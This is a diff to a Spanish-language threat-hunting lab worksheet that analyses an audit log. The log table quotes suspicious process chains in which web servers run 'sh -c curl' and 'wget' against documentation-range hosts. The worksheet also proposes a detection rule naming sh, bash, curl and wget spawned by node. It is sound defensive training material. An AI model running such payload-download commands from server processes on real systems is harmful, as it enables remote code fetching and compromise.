@@ -81,21 +81,26 @@ py-lab     Up (healthy)   8000/tcp
 
 ## 4. Detección y caza
 
-**Hipótesis:** _una frase: proceso, padre, horario, evidencia esperada._
+**Hipótesis:** Si una aplicación web vulnerable es explotada para ejecutar comandos, esperamos observar procesos hijos inusuales iniciados por `apache2` o `node`, como `sh`/`bash`, y herramientas de reconocimiento o descarga (`id`, `uname`, `curl`, `wget`). Se investigan eventos entre 09:42 y 09:45 UTC del 27/10/2026.
 
 **Hallazgos en `audit.log`:**
 
-| Línea / timestamp | Host | Padre → hijo | ¿Anómalo? | Por qué |
-|-------------------|------|--------------|:---------:|---------|
-| | | | | |
-| | | | | |
+| Timestamp (UTC) | Host | Padre → hijo | ¿Anómalo? | Por qué |
+|---|---|---|---|---|
+| 09:42:17–09:42:18 | `web01` | `apache2 → sh -c id → id` | Sí | Un proceso web inicia shell y comando de reconocimiento de identidad. |
+| 09:43:03–09:43:04 | `api01` | `node → sh -c curl http://198.51.100.7/x → curl` | Sí, alta prioridad | Node inicia shell y herramienta de descarga. La IP está reservada para documentación, indicando probablemente datos de laboratorio. |
+| 09:44:22 | `web01` | `apache2 → wget http://198.51.100.9/a` | Sí | Descarga iniciada desde el proceso del servidor web; posible payload. |
+| 09:45:10–09:45:11 | `svc01` | `python → sh -c uname -a → uname` | Sospechoso | Reconocimiento del sistema; puede ser diagnóstico legítimo y requiere correlación. |
 
-**¿Hay compromiso?** _sí/no/indeterminado, con evidencia._
+**¿Hay compromiso?** Indeterminado, con indicios fuertes de ejecución sospechosa. Las cadenas `apache2 → sh → id`, `node → sh → curl` y `apache2 → wget` son compatibles con ejecución de comandos. No obstante, el log no incluye usuario, IP de origen, request HTTP, resultado de la descarga ni evidencia de ejecución posterior; no confirma por sí solo un compromiso ni la vulnerabilidad explotada.
 
-**Regla propuesta para Node.js:** _qué proceso observa, qué condición y qué falso
-negativo podría tener._
+**Falsos positivos:** `python → sh → uname -a` en `svc01` podría ser una tarea de diagnóstico/inventario. Validar código del servicio, tareas programadas, ventana de mantenimiento y línea base. `sshd → bash` en `db01` puede corresponder a sesiones SSH legítimas; contrastar con usuarios e IP autorizados.
 
-**Limitaciones del log:** _usuario, IP de origen, retención, ruido, etc._
+**Regla propuesta para Node.js:** alertar si `node` inicia `sh`, `bash`, `curl` o `wget`, directamente o como descendiente, especialmente si aparecen `-c`, URLs o IPs. La regla observa parent/child, PID/PPID y argumentos. Puede tener falsos negativos si se usa otra herramienta (Python/Perl/BusyBox), si el atacante ejecuta dentro del propio proceso Node o si no se registra el árbol de descendientes.
+
+**Limitaciones:** el log carece de UID/usuario, IP cliente, puerto, request HTTP, request-ID, código de salida, resultado de descarga, hashes, conexiones de red y eventos de archivos/persistencia. El fragmento cubre solo 09:40–09:49 UTC, con cobertura y retención desconocidas; hay poco contexto para línea base y falsos positivos. Confirmar sincronización horaria. Las IP `198.51.100.7` y `.9` son de rangos reservados para documentación, no indicadores reales sin corroboración.
+
+El análisis completo, incluyendo hipótesis, eventos, falsos positivos, regla y limitaciones, se encuentra en [`../deteccion.md`](../deteccion.md).
 
 ---
 
